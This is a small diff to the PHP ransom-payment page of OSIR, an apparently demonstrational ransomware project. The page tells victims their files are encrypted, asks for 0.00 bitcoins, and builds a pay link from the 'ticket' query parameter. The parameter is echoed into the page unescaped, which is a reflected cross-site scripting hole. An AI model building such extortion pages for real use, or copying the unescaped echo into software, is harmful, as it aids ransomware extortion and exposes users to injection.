@@ -10,7 +10,9 @@
 			Your files have been safely encrypted with RSA and AES-128 using <a href="https://github.com/Property404/OSIR">OSIR</a>. To retrieve them, please generously donate <code>0.00</code> bitcoins.
 			<p>
 			<?php
-				echo("<a href='pay.php?ticket=".$_GET['ticket']."'>Pay and receive your decryption key</a>\n");
+				if(!array_key_exists("ticket",$_GET))
+					header("Location: ./");
+				echo("<a href='pay.php?ticket=".$_GET['ticket']."'>Pay now to receive your decryption key</a>\n");
 			?>
 			<p>
 		</div>
